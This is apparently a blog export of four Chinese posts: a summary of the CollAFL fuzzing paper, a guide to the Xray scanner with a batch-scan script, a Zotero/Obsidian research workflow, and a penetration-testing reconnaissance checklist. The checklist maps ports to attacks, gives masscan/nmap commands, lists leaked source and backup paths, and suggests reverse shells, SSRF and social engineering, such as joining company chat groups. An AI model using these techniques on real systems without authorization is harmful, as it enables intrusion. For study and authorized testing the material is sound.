[{"title":"CollAFL_在提高代码覆盖精确度背景下优化漏洞挖掘效果","date":"2023-03-12T12:08:32.000Z","path":"2023/03/12/prlw/","text":"这是一篇来自于IEEE TDSC的文章分享，文章名为《Path Sensitive Fuzzing for Native Applications》。其关注点是模糊测试中代码覆盖这一环节的精确度，由此进一步去提高模糊测试的准确性。 浅谈背景信息模糊测试经过长时间的发展，逐渐形成了适合不同领域的模糊策略，其中最为普适且有着较好测试效果的当属基于覆盖引导的模糊测试，其根据代码覆盖率对种子调度进行指导，切合实际测试效果给出指导，在很多领域均取得极佳的漏洞挖掘效果。但是基于覆盖引导的模糊测试受制于仪器开销等物理因素、执行路径爆炸等理论因素，得到的多为粗略覆盖信息。此处仅以最常见的AFL为例，AFL采用一张存有边命中数量的紧凑位图，通过静态分析获取覆盖率信息，但是随机生成的哈希算法却有可能时两条不同的边具有相同的哈希值，这就会知道在位图中二则的记录相同，如此统计出来的覆盖率精度必然有所损失。 考虑到AFL技术作为最基础的模糊测试技术，对各种现实程序有着较好的适应效果。本文在AFL技术的基础上对其在哈希冲突方面的问题进行优化，并由此引申出三种全新的模糊策略，这些在精度提高的覆盖信息上有着很好的效果。本文的贡献有以下几点： 01 证实了哈希冲突对于边覆盖信息的精确度有着极大的影响。 02 设计出解决哈希冲突的算法，同时保持低开销，高精度。 03 在提高了覆盖信息的精确度后，提出了新的模糊测试策略。 04 在本文的方法上衍生出两个变体，用于测试无源码的测试程序。 分析如今代码覆盖准确率低的源头何在覆盖引导的模糊器其漏洞挖掘效果很大程度上受到覆盖信息准确度的影响。由于在现实程序中跟踪所有路径覆盖时不可行的，主流方法主要考虑跟踪基本块覆盖率及边覆盖率。但是由边覆盖可以推导出块覆盖，反之则不然。 如图所示，两个程序P1和P2,他们共享大部分边，但是其在函数foo中的子路径不同，他们的块覆盖完全相同，但是其边覆盖不同，比如其中的B1→C1仅存在于路径P1中。 因此本文的主要思想还是建立在考虑边覆盖来标识覆盖信息上，而主流的使用边覆盖的方法AFL，却面临着哈希冲突带来的覆盖信息误差大的问题。 哈希冲突问题的根源在于AFL在使用位图来跟踪应用程序边覆盖的时候，边使用随机的哈希值来标识，但是由于算法的随机性，两条不同的边可能具有相同的哈希值，这使得模糊器无法区分这样的两条边，最终导致覆盖信息不准确。 一直以来，AFL技术的显著漏洞挖掘效果，掩盖了其中覆盖信息精度极低的问题，甚至由部分程序，边碰撞率高达70%以上，提高覆盖信息精度给漏洞挖掘工作带来的收益是极大的。 为解决哈希冲突问题而具体情况具体分析现实程序中的基本块一般可分为三类，根据其前置块（precedent）的数量先分为由多个前置块和单个前置块两种，再对多个前置块进行接下来的分析做进一步区分。之所以根据前置块数量区分，是由于从哈希算法给边分配哈希值的角度触发，对于多前置块，即多条如边的块，其处理方式与单前置块，单入边的块处理方式不同。 公式中的关键在于x,y,z三个参数的选取，其中y值同一程序取值相同，而x，z的值则通过遍历的方法，其判断条件为所有多前置块的基本块其参数选取均不同，在此基础之上，可以保证所有边的散列值不同，从而缓解哈希冲突问题。其伪代码如下。 如代码中显示，在选取参数时采用贪婪算法实现，但是其中会存在不可解析块，对此，在为其设计有针对性的哈希值分配方法。 这里需要注意的是，不可解析的块的参数分配是在可解析块结束后，构建一个哈希表，表中会筛选掉可解析快已经使用的哈希值，转而从未使用的哈希中选取唯一的哈希值给以不可解析快结尾的边，这一步操作均可在离线状态下完成，降低实验的时间开销。其思想如下图。 至此，所有多前置块都已被处理殆尽，还剩下的单前置块，这里根据前置操作中构造的Freehashes表获取此时位图中还剩下的哈希值，赋给剩下的但前置块，这一步也可以通过离线操作完成。 三类基本块的处理方法中，由多前置块的基本块解析操作，遍历寻求参数均需要较大的开销，最终三者的时间开销方面。 cost(Fhash) &gt; cost(Fmul) &gt; cost(Fsingle) ≈ 0 但是在现实程序中，三者的数量却区别极大，其中绝大多数为但前置块的Fsingle算法，一部分多前置块，可解析的Fmul算法，而剩下的Fhash算法对应的不可解析多前置块的情况只有极少数，几乎可以忽略不计，这也使得其带来的高昂计算成本在现实程序中的影响不大。 高精度覆盖信息所带来的全新模糊策略在拥有了准确的代码覆盖信息后，本文提出以下三个全新的模糊测试策略： 1.对于一条路径，倘若有多个未被探索的分支，那么对该路径的突变可能会探索那些分支。 2.对于一条路径，倘若其未被探索的分支有多个后代，那么对该路径突变有可能会探索那些后代。 3.考虑到最终目标是提高漏洞挖掘效率，那如果一个路径有多次内存访问操作，对其突变可能触发潜在的内存相关崩溃，漏洞。 基于这样的三个思想，从以下三个角度提出全新的模糊策略。 （一）其执行路径有着多个未覆盖分支的种子这里会给予那些未覆盖分支以权重，通过加权的方式来衡量这些种子提高代码覆盖，探索未覆盖领域的能力。此方法记为CollAFL-br。 图中IsUntouched()的值将根据边是否被覆盖表示为0（未覆盖）或1（已覆盖）。 （二）对于未覆盖分支的后代对提高代码覆盖的影响。这里需先统计种子执行路径下的未覆盖分支，随后根据这些分支计算其后代的数量。 这个方法标识未CollAFL-Desc，其计算的权重Weight_Desc()是一个动态结果，其具体值随着模糊测试过程中，未覆盖边IsUntouched()值的变化而变化，但是考虑到每个未覆盖块的后代数量是确定的，这一步计算为静态值，即 该计算可以在离线情况下完成。 （三）关于高内存访问在漏洞挖掘中的影响。这里从种子执行路径中，内存访问次数为加权目标，计算其是否有希望发现内存漏洞，之所以这里着重强调内存相关漏洞，是由于在历史研究中表明，内存相关漏洞在总的漏洞中占比较高。 具体实验来论证文章观点实验选择了24个开源Linux应用程序的最新版本，包括主流工具，图像处理库，音频视频处理工具，文档处理工具等，主要参考要素是其在社区中受欢迎程度，发展活跃度。此外还对带有4个设置好漏洞的LAVA-M数据集进行评估。 实验中对CollAFL和其三种不同模糊策略-br，-desc，-mem都进行了评估。实验中设置的虚拟机使用2 GHz Intel CPU和1GB RAM，Ubuntu版本为15.10. 哈希冲突对覆盖信息准确率的影响有多少AFL在计算边命中信息时，采用的位图默认为64KB大小，对于哈希冲突问题，传统想法有扩大位图从而减小边碰撞概率，事实上，扩大位图确实在一定程度上缓解了碰撞问题。 如图，在位图扩大到1MB以后，边碰撞比已经是一个较低的状态。但是需要注意的是，模糊器在获取到覆盖信息后，准备进行下一步指导种子调度等操作时，需要去查询位图获取边命中情况，这里就需要对位图进行遍历，倘若贸然地扩大位图，这给模糊器每次访问带来的时间开销将会是几何级增长。 显然，在位图扩大的过程中，所有程序的执行速度均大幅度下降，对比降低边碰撞比的收益和其带来的巨额时间开销，简单扩大位图的操作，是一种低收益的操作。哈希冲突对于代码覆盖精度的影响不能简单通过扩大位图去改善。 本文提出的CollAFL技术在代码覆盖方面的表现 如图所示，200个小时内，不同模糊器在11个应用程序上的探索路径总数上，CollAFL平均多找到了9.9%的路径，其中尤其是考虑未覆盖分支的模糊策略-br，其平均多发现了20.78%的路径。而和相对比AFL-fast，即优先考虑低访问次数的路径，CollAFL表现出更优的路径覆盖率，平均多找到8.45%的路径。 CollAFL在发现独特崩溃方面的能力除了代码覆盖率，漏洞挖掘的效果很大程度上也要取决于特殊崩溃的发现，进而联系到发现的漏洞数量，二者大体是正相关的。 从图中发现，以所有模糊器发现崩溃数的平均值为基线，CollAFL对比AFL和AFL-fast均有更优表现。其中最突出的两条，表明CollAFL衍生出的新模糊策略在一些具体的程序上有着特别优秀的表现。 最终该方法确定了157个漏洞，这些漏洞在提交给开发者后均证实为程序存在的问题。 面对现实程序的随机性表现如何在衡量测试随机性时，选择对同一程序进行20次漏洞挖掘，分析其中多少次发现了漏洞，耗时多久，由此判断测试方法应对现实程序的测试随机性如何。 在测试程序中，Exiv2的随机性最大，在其上的测试中CollAFL仍优于AFL技术，除了意外，多数程序上，CollAFL技术均能实现20此实验全部或基本上都挖掘到漏洞，且用时也较短。 结论本文研究了覆盖引导模糊器中覆盖误差的负面影响。我们提出了一种覆盖敏感模糊解决方案CollAFL，它解决了最先进的fuzzer AFL中的散列冲突问题，在保持低仪器开销的同时实现更准确的边缘覆盖信息。本文还提出三种模糊策略，经实验证明效果更优。","tags":[{"name":"论文分享","slug":"论文分享","permalink":"http://yoursite.com/tags/论文分享/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://yoursite.com/tags/漏洞挖掘/"}]},{"title":"扫描工具Xray使用方法","date":"2022-12-30T10:39:32.000Z","path":"2022/12/30/xrayab/","text":"当我们需要寻找一个网站的漏洞时，自动化漏洞扫描工具XRAY是一个不错的选择，省时省力，还可以通过编写代码实现对批量网站的自动扫描。 1. XRAY简介根据官方文档介绍，XRAY目前支持的漏洞检测类型包括: XSS漏洞检测 (key: xss) SQL 注入检测 (key: sqldet) 命令/代码注入检测 (key: cmd-injection) 目录枚举 (key: dirscan) 路径穿越检测 (key: path-traversal) XML 实体注入检测 (key: xxe) 文件上传检测 (key: upload) 弱口令检测 (key: brute-force) jsonp 检测 (key: jsonp) ssrf 检测 (key: ssrf) 基线检查 (key: baseline) 任意跳转检测 (key: redirect) CRLF 注入 (key: crlf-injection) Struts2 系列漏洞检测 (高级版，key: struts) Thinkphp系列漏洞检测 (高级版，key: thinkphp) POC 框架 (key: phantasm) 大至 OWASP Top 10 通用漏洞检测，小至各种 CMS 框架 POC，均可以支持。并且作为为一款安全辅助评估工具，而不是攻击工具，内置的所有 payload 和 poc 均为无害化检查。还可以通过配置文件对功能进行定制。扫描结果有四种输出方式，分笔试屏幕输出、JSON文件输出、HTML报告输出和Webhook输出。 2. 运行XRAY提供了三种扫描模式，分别是代理模式、基础爬虫模式和服务模式，每种扫描模式各有优劣，选择适合自己需求的扫描模式使用即可。 2.1 代理模式扫描当XRAY作为浏览器代理进行工作时，它会作为中间人将浏览器的请求和服务器的响应原样转发，但会记录下浏览器的访问对象，对访问对象进行漏洞扫描工作。 若浏览器使用https协议进行通行，我们首先应配置CA证书，获取浏览器的信任后才可作为代理工作。XRAY有自动生成CA证书的命令。 1.\\xray_windows_amd64.exe genca 获取CA证书后，依照自己使用的浏览器，进行证书添加即可。添加完证书后，不要忘记对浏览器进行相应的代理配置。准备工作完成后，输入下方命令即可运行XRAY代理。 1.\\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html 开启运行后，XRAY就会对我们使用浏览器访问的网页进行自动扫描了。 2.2 基础爬虫模式扫描爬虫模式与代理模式的不同之处在于，在命令行输入需要扫描的对象即可进行扫描，与编程语言结合使用时，还可实现对批量网站的自动化后台扫描。但该模式有一个缺点，不能处理js渲染的页面。 运行爬虫模式的命令为： 1./xray_windows_amd64 webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xray-crawler-testphp.html 2.3 服务模式扫描XRAY的常用功能是web扫描，但其在逐渐研发服务扫描的相关能力，目前主要是服务扫描相关的 poc。目前只有一个 tomcat-cve-2020-1938 ajp 协议任意文件检测 poc。 目前支持两种扫描方式，分别问检测单个目标和批量检测文件中的多个目标： 12./xray servicescan --target 127.0.0.1:8009./xray servicescan --target-file 1.file 3. 实现批量自动扫描这里为大家介绍使用PYTHON编写自动扫描脚本的方法 12345678910111213141516171819202122232425import pandas as pdimport subprocessdef xray(host): # 将域名作为HTML输出文件的文件名，存储该网站链接的扫描结果 # 使用subprocess.Popen方法创建子程序执行XRAY命令 # 调用wait方法，一次只扫描一个网站链接，可根据性能对并发度进行调整 name = host.replace('https://', '').replace('http://', '').replace('/', '') cmd = [\"xray\", \"webscan\", \"--basic-crawler\"] cmd += [host] cmd += [\"--json-output\", name] p = subprocess.Popen(cmd) p.wait()if __name__ == \"__main__\": # 读取data文件，提取data文件中的网站链接 # 对每一个网站链接，执行相应的xray扫描命令，扫描模式为基础爬虫模式 xlsx = pd.ExcelFile(r'data.xlsx') sheet1 = pd.read_excel(xlsx, 'Sheet1') for host in sheet1['网站链接']: xray(host) xlsx.close()","tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://yoursite.com/tags/漏洞挖掘/"}]},{"title":"科研工作流","date":"2022-11-09T10:39:32.000Z","path":"2022/11/09/sciresworkflow/","text":"老白兔今天总结一下自己论文查找、阅读、记录的工作流。主要包含三部分内容： 文献管理：使用Zotero管理文献 文献阅读：在Windows平台上实现Zotero与笔记应用Obsidian跨应用联动 数据跨平台同步：文献PDF文件与Obsidian笔记在Windows, iOS, Android全平台同步 1. 使用Zotero管理文献Zotero是一个免费开源的文献管理工具，可以轻松地收集、管理、阅读和引用文献。 Zotero的功能可以参考：Zotero的操作指南 1.1 Zotero文献收集Zotero有三种文献收集方式： 导入已下载在本地的PDF文件 输入文献DOI自动获取文献PDF文件 使用浏览器插件Zotero Connector自动导入当前网页中的文献 Zotero自动导入文献后，会自动解析PDF元数据，提取标题、作者、摘要等信息。 1.2 Zotero文献管理随着论文愈看愈多，为了解决大量PDF文件的管理问题，Zotero提供了Collection功能。实际上就类似于在文件管理系统中创建文件夹，将一个个文献归入相关文件夹中。Zotero的优势就是支持引用，允许一个文献归入多个不同Collection中。 如果只是Collection功能完全不够，还需要辅以ZotFile插件，在配置后可以自动根据配置重命名、移动文件，使用WebDav实现跨平台同步。 使用ZotFile自动组织PDF文件可以参考：zotero文献管理器插件：ZotFile的安装和使用 两个小建议： 文件组织：使用Collection层级关系作为PDF文件的相对路径 重命名：使用年份+文章标题为PDF文件重命名 看官可能不禁产生疑问，为什么要使用ZotFile对文献重新组织、重命名呢？不做这一步操作依旧可以正常使用Zotero原生的Collection功能进行文献管理与阅读。 如果只在一台电脑上工作，没有多主机、跨平台同步，确实Collection就够了。但如果需要台式机、笔记本多主机同步文件，手机、平板以至于Web端跨平台阅读，Zotero默认的杂乱无章的文件组织方式就满足不了需求了。 借助ZotFile，自动使用文件夹对PDF文件的组织方式进行重组，方便在不同应用中查找、阅读。 1.3 PDF文件的跨平台同步辛辛苦苦在ZotFile上配置文件组织、重命名规则，就是为了这一步文件跨平台同步。 其主要原理就是支持WebDav协议的客户端和支持WebDav协议的云存储服务商之间，通过WebDav协议进行通信，实现文件的存储和下载。在Zotero中，由ZotFile插件实现对WebDav协议的支持。 使用坚果云作为云存储服务商的解决方案可以参考：Zotero+坚果云WebDAV实现跨平台同步 以上，成功将本地文献同步至支持WebDav协议的云盘中。接下来就是使用另一个平台上的支持WebDav协议的客户端，将云盘中的文献同步到本地使用。 可以是另一台Windows主机上的坚果云客户端，实现不同主机上的无缝同步。 可以是iPad上的PDF Expert（PDF Expert打开坚果云里的文件），在iPad上阅读文献。 可以是Android上的WPS（WPS打开坚果云里的文件），在手机上阅读文献。 三个小建议： 坚果云免费空间太小，可以使用Koofr的云存储服务，免费空间充足。 Android端只是偶尔进行文献阅读，没有PDF标注数据同步的需求，可以使用Koofr自身所提供的Android客户端，下载之后使用相应阅读器打开。 iPad上会对PDF进行标注，使用PDF Expert通过WebDav协议连接Koofr，实现标注信息的实时同步。 2. Zotero与Obsidian的梦幻联动上一节实现了使用Zotero随时随地，使用任何设备阅读文献。但阅读过程中不可避免的会想要对文献进行标注、关联，输出笔记、思维导图。随着阅读文献数量的增加，想要将具有某一相同主题的不同文献关联在一起，构建文献的知识图谱。作为MarginNote的重度用户，对于其点击引用直接跳转回原文的功能爱得深沉。 那么，有没有一款应用能支持一键导出Zotero中的笔记，支持构建知识图谱，支持点击引用跳转回Zotero中原文？答案是Obsidian。 用一句话描述Obsidian：支持双链的Markdown文件编辑、管理平台。其功能可以参考：Obsidian是什么以及它能用来做什么。 如果只看其原生功能，也就双链功能可以解决我构建知识图谱的痛点。但是，同Zotero一样，其强大之处在于其让人眼花缭乱的插件支持。 如何使Obsidian与Zotero联动起来，像MarginNote般丝滑，参考：Zotero和Obsidian联动最优解决方案以及最优解决方案的配置指南。 3. Obsidian笔记跨平台同步上一节实现Obsidian与Zotero的联动，但一想到文献的跨平台阅读，我们不禁又想拥有笔记的跨平台阅读。好在Obsidian拥有全平台客户端，现在的问题只是如何在不同平台上同步Markdown文件。 Markdown本身作为纯文本文件，使用Git进行版本控制、跨平台同步，pull到本地之后用Obsidian客户端打开即可。 Github 创建私有仓库 Windows 上将Obsidian的Vault文件夹push到本地仓库中 Android 上使用spck editor作为git客户端拉取文件，使用Obsidian打开仓库 iOS设备上使用iSH作为git客户端，使用mount指令实现多应用间共享文件夹，参考iOS上使用iSH的git同步obsidian 4. 总结各平台工作流支撑软件汇总： Windows: Zotero, Obsidian, Koofr, Git Android: Koofr, Spck Editor, Obsidian iOS: PDF Expert, iSH, Obsidian Cloud: Github, Koofr","tags":[{"name":"科研","slug":"科研","permalink":"http://yoursite.com/tags/科研/"},{"name":"学术","slug":"学术","permalink":"http://yoursite.com/tags/学术/"}]},{"title":"信息收集","date":"2022-10-21T09:39:32.000Z","path":"2022/10/21/infogather/","text":"信息收集对于渗透测试前期来说是非常重要哒！！！信息收集得够全面，后面的工作就更轻松，最近整理了关于信息收集流程，收集内容以及常用网站、工具，希望对大家有帮助~有需要补充的地方欢迎留言！！！ 1.信息收集流程1、厂商信息收集： whois、启信宝、天眼查、域名备案、服务供应商、第三方厂商系统 2、资产归属判断： whois、备案信息、域名证书、数字签名、logo、title 3、资产收集维度： WEB、APP、PC客户端、微信公众号、微信小程序、支付宝小程序、QQ、钉钉、企业微信、微信群、QQ群 4、资产收集内容： 子域名、IP、C段、旁站、WEB路径、参数名、文件名、协议、数据包类型、邮箱、ID、用户名、密码、手机号、员工工号、重要系统密码规则、身份证号、企业资质证书、法人信息 2.企业信息启信宝 天眼查 收集内容： 企业规模、投资关系 微信公众号、微博、备案站点、软件著作权、产品 高管信息 启信宝 3.收集域名信息3.1Whois查询Whois 简单来说，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商、域名注册日期和过期日期、DNS等）。通过域名Whois服务器查询，可以查询域名归属者联系方式，以及注册和到期时间。 Kali下whois查询 域名Whois查询 - 站长之家 Whois 爱站 ip138 Whois Lookup ICANN Lookup 域名信息查询 - 腾讯云 nicolasbouliane 新网 whois信息查询 IP WHOIS查询 - 站长工具 3.2备案信息查询国内网站注册需要向国家有关部门申请备案，防止网站从事非法活动，而国外网站不需要备案。 还可通过备案信息反查兄弟域名。 ICP备案查询网 CP备案查询和反查 ICP备案查询-站长工具 SEO综合查询-爱站 批量查询-站长工具 工业和信息化部ICP/IP/域名信息备案管理 美国企业备案查询 3.3真实IP查询绕过CDN查找真实IP方法,参考链接：https://www.cnblogs.com/qiudabai/p/9763739.html 验证是否存在CDN 方法一：很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/ 方法二：使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。 有 CDN 的示例： www.163.com 服务器: public1.114dns.com Address: 114.114.114.114 非权威应答: 名称: 163.xdwscache.ourglb0.com Addresses: 58.223.164.86 125.75.32.252 Aliases: www.163.com www.163.com.lxdns.com 无 CDN 的示例： xiaix.me服务器: public1.114dns.comAddress: 114.114.114.114 非权威应答:名称: xiaix.meAddress: 192.3.168.172 解决方法 方法一:查询历史DNS记录（推荐） 123456查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：https://dnsdb.io/zh-cn/ ###DNS查询https://x.threatbook.cn/ ###微步在线http://toolbar.netcraft.com/site_report?url= ###在线域名信息查询http://viewdns.info/ ###DNS、IP等查询https://tools.ipip.net/cdn.php ###CDN查询IP 方法二:查询子域名 方法三：网络空间引擎搜索法（推荐） 1常见的有以前的钟馗之眼，[shodan](https://www.shodan.io/)，[fofa搜索](https://fofa.so/)。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。 方法四:利用SSL证书寻找真实原始IP 方法五:利用HTTP标头寻找真实原始IP 方法六:利用网站返回的内容寻找真实原始IP 方法七:使用国外主机解析域名 方法八:网站漏洞查找1231）目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。2）XSS盲打，命令执行反弹shell，SSRF等。3）无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。 3.4IP反查绑定的域名网站IP关联域名，大部分网站一个IP多个域名 chinaz aizhan webscan.cc https://censys.io/ipv4?q=baidu.com（非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。） 4.子域名收集4.1在线平台第三方平台查询（推荐）主要是一些第三方网站和一些博主提供的服务 ip138（推荐） 站长工具 hackertarget phpinfo（在线爆破） t1h2ua（在线爆破） dnsdumpster zcjun（在线爆破） 权重综合查询 爱站 站长工具 全国政府网站基本数据库 Address Link 5.收集主机信息5.1常用的端口利用及解析总结1234567891011121314151617181920212223242526272829303132333435363738端口：21 服务：FTP/TFTP/VSFTPD 总结：爆破/嗅探/溢出/后门端口：22 服务：ssh远程连接 总结：爆破/openssh漏洞端口：23 服务：Telnet远程连接 总结：爆破/嗅探/弱口令端口：25 服务：SMTP邮件服务 总结：邮件伪造端口：53 服务：DNS域名解析系统 总结：域传送/劫持/缓存投毒/欺骗端口：67/68 服务：dhcp服务 总结：劫持/欺骗端口：110 服务：pop3 总结：爆破/嗅探端口：139 服务：Samba服务 总结：爆破/未授权访问/远程命令执行端口：143 服务：Imap协议 总结：爆破161SNMP协议爆破/搜集目标内网信息端口：389 服务：Ldap目录访问协议 总结：注入/未授权访问/弱口令端口：445 服务：smb 总结：ms17-010/端口溢出端口：512/513/514 服务：Linux Rexec服务 总结：爆破/Rlogin登陆端口：873 服务：Rsync服务 总结：文件上传/未授权访问端口：1080 服务：socket 总结：爆破端口：1352 服务：Lotus domino邮件服务 总结：爆破/信息泄漏端口：1433 服务：mssql 总结：爆破/注入/SA弱口令端口：1521 服务：oracle 总结：爆破/注入/TNS爆破/反弹shell2049Nfs服务配置不当端口：2181 服务：zookeeper服务 总结：未授权访问端口：2375 服务：docker remote api 总结：未授权访问端口：3306 服务：mysql 总结：爆破/注入端口：3389 服务：Rdp远程桌面链接 总结：爆破/shift后门端口：4848 服务：GlassFish控制台 总结：爆破/认证绕过端口：5000 服务：sybase/DB2数据库 总结：爆破/注入/提权端口：5432 服务：postgresql 总结：爆破/注入/缓冲区溢出端口：5632 服务：pcanywhere服务 总结：抓密码/代码执行端口：5900 服务：vnc 总结：爆破/认证绕过端口：6379 服务：Redis数据库 总结：未授权访问/爆破端口：7001/7002 服务：weblogic 总结：java反序列化/控制台弱口令端口：80/443 服务：http/https 总结：web应用漏洞/心脏滴血端口：8069 服务：zabbix服务 总结：远程命令执行/注入端口：8161 服务：activemq 总结：弱口令/写文件端口：8080/8089 服务：Jboss/Tomcat/Resin 总结：爆破/PUT文件上传/反序列化端口：8083/8086 服务：influxDB 总结：未授权访问端口：9000 服务：fastcgi 总结：远程命令执行端口：9090 服务：Websphere 总结：控制台爆破/java反序列化/弱口令端口：9200/9300 服务：elasticsearch 总结：远程代码执行端口：11211 服务：memcached 总结：未授权访问端口：27017/27018 服务：mongodb 总结：未授权访问/爆破 5.2扫描工具Masscan项目地址：https://github.com/robertdavidgraham/masscan Masscan主要是真对全网进行端口扫描 123masscan --ping 192.168.1.0/24 --rate 10000masscan -iL tmp_scanip_list.tmp -p1-65535 -Pn -v --randomize-hosts --banners -oX result.xml --rate 10000 Nmap项目地址：https://github.com/nmap/nmap. 扫描存活主机 -sL 列出要扫描的ip -sn 不进行端口扫描 -Pn 将所有主机都默认为在线，跳过主机发现 -PS/PA/PU/PY 使用TCP、SYN/ACK、UDP或SCTP协议去发现端口 -PE/PP/PM：使用ICMP响应（echo）、时间戳或子网掩码请求来发现探测 -P0 不使用IP协议的ping -n 不做DNS解析 -R 总是做DNS反向解析 --dns-servers指定自定义的DNS服务器 --system-dns 使用操作系统的DNS --traceroute 追踪每台主机的跳转路径 123nmap -sP 192.168.123.1/24 //ping扫描nmap -p0 192.168.123.1/24 //无ping扫描nmap -PS 192.168.123.1/24 //TCP Syn Ping扫描 推荐命令 1nmap -sC -v -A IP -p PORT -oN result.txt 常用命令 12345678910nmap -p- -Pn -sV -v -open -T4 -n -sS -O x.x.x.x-p- 扫描全端口-Pn 不ping扫描-sV 扫描版本信息-v 显示扫描过程--open 只显示开放端口-T4 设置时序模板为自动控制-n 不进行dns解析-sS SYN半连接扫描-O 扫描操作系统 快速扫描所有端口： 1nmap -sS -p 1-65535 -v 192.168.99.177 Masscan+Nmap有些时候网站的入口点属于非常规端口，因此是必须要做全端口扫描，做全端口扫描的时候由于namp发包量大经常出现各种问题，如端口扫描不全、获得信息不准等等，为了解决上述问题，这里提供一个masscan+nmap结合的方式进行快速扫描。 原理：使用masscan做全端口开放检测，检测出来端口信息后，用nmap进行服务信息识别。 使用：终端输入以下命令执行即可 123456789# masscan --ping 192.168.1.0/24 --rate 10000 nmap -sP 192.168.1.0/24# masscan 192.33.6.145 -p1-65535 --rate 1000 -oL ports# ports=$(cat ports | awk -F &quot; &quot; &apos;&#123;print $3&#125;&apos; | sort -n | tr &apos;\\n&apos; &apos;,&apos; | sed &apos;s/,$//&apos; | sed &apos;s/^,,//&apos;)# nmap -sV -p $ports 192.33.6.145 nmap -sC -v -A IP -p PORT -oN result.txt masnmapscan项目地址：https://github.com/hellogoldsnakeman/masnmapscan-V1.0 masnmapscan整合了masscan和nmap两款扫描器，masscan扫描端口，nmap扫描端口对应服务，二者结合起来实现了又快又好地扫描。并且加入了针对目标资产有防火墙的应对措施。 Zmap项目地址：https://github.com/zmap/zmap Zmap主要是真对全网进行端口扫描 6.指纹识别Web指纹识别技术研究与优化实现：https://www.anquanke.com/post/id/178230 常见指纹检测的对象 123456789101、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；5、开发语言：比如PHP、Java、Ruby、Python、C#等；6、操作系统信息：比如linux、win2k8、win7、kali、centos等；7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等；9、IP及域名信息：IP和域名注册信息、服务商信息等；10、端口信息：有些软件或平台还会探测服务器开放的常见端口。 指纹识别在漏洞挖掘中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。 CMS (Content Management System)又称整站系统或文章系统。常见的CMS有Dedecms (织梦)、Discuz、 PHPWEB、 PHPWind、PHPCMS、ECShop、 Dvbbs、 SiteWeaver、 ASPCMS、帝国、Z- Blog、WordPress等。 第三方平台 云悉 TideFinger BugScaner 数字观星 工具常用指纹识别工具有：御剑Web指纹识别、WhatWeb、Test404轻量CMS指纹识别+v2.1、椰树等，可以快速识别一些主流CMS Github项目 Whatweb（推荐） CMSeeK CMSmap ACMSDiscovery TideFinger AngelSword 7.收集敏感信息7.1敏感信息收集网站 网盘搜索：http://www.pansou.com/ 或 https://www.lingfengyun.com/网盘密码破解：https://www.52pojie.cn/thread-763130-1-1.html社工信息泄露：https://www.instantcheckmate.com/、http://www.uneihan.com/源码搜索：https://searchcode.com/、https://gitee.com/、https://gitcafe.com、https://code.csdn.net钟馗之眼： https://www.zoomeye.org/天眼查： https://www.tianyancha.com/ 这个有破解使用企业版查询的办法佛法：https://fofa.so/ 帮助文档：https://fofa.so/help微步在线：https://x.threatbook.cn/360情报中心：https://ti.360.cn/在线查毒：https://www.virustotal.com/l 7.2目录&amp;后台扫描常用工具 7kbscan https://github.com/7kbstorm/7kbscan-WebPathBrute DirMap https://github.com/H4ckForJob/dirmap dirsearch https://github.com/maurosoria/dirsearch Fuzz-gobuster https://github.com/OJ/gobuster Fuzz-dirbuster OWASP kali自带 Fuzz-wfuzz https://github.com/xmendez/wfuzz Test404轻量后台扫描器+v2.0 御剑 破壳Web极速扫描器 个人比较喜欢使用Fuzz大法，不管是目录扫描、后台扫描、Web漏洞模糊测试都是非常灵活的。这几款fuzz工具都比较好用 123基于Go开发：gobuster基于Java开发：dirbuster基于Python开发：wfuzz kali默认字典目录： /usr/share/wordlists/ 7.3源码泄露常见源码泄露1234567891011121314/.bzr//CVS/Entries/CVS/Root/.DS_Store MacOS自动生成/.hg//.svn/ (/.svn/entries)/.git//WEB-INF/src//WEB-INF/lib//WEB-INF/classes//WEB-INF/database.properties/WEB-INF/web.xmlRobots.txt 上述源码泄露在Github上都可以找到相应的利用工具 A 网页扫描通过扫描器扫描web站点，看是否有源码相关目录被泄漏，如有，再通过特殊工具恢复 工具如：破壳web扫描器、御剑扫描器 B github类信息泄漏GitHub敏感信息泄露一直是企业信息泄露和知识产权泄露的重灾区，安全意识薄弱的同事经常会将公司的代码、各种服务的账户等极度敏感的信息『开源』到github中，github也是黑、白帽子、安全工程师的必争之地。 全自动监控github：https://sec.xiaomi.com/article/37GitHub敏感信息泄露监控：GSIL、Github-Monitor在GitHub中一般通过搜索网站域名、网站JS路径、网站备案、网站下的技术支持等进行敏感信息查询 C 社工方式收集还可以在QQ群备注或介绍等，甚至混入企业qq工作群查找，这设计社工范畴了 D 源码泄露利用工具 .git源码泄露：https://github.com/lijiejie/GitHack .DS_Store泄露：https://github.com/lijiejie/ds_store_exp .bzr、CVS、.svn、.hg源码泄露：https://github.com/kost/dvcs-ripper 7.4备份文件泄露备份文件泄露常见名称123456789101112backupdbdatawebwwwrootdatabasewwwcodetestadminusersql 备份文件泄露常见后缀123456789101112.bak.html_index.html.swp.rar.txt.zip.7z.sql.tar.gz.tgz.tar 备份文件泄露扫描工具常见扫描工具有： 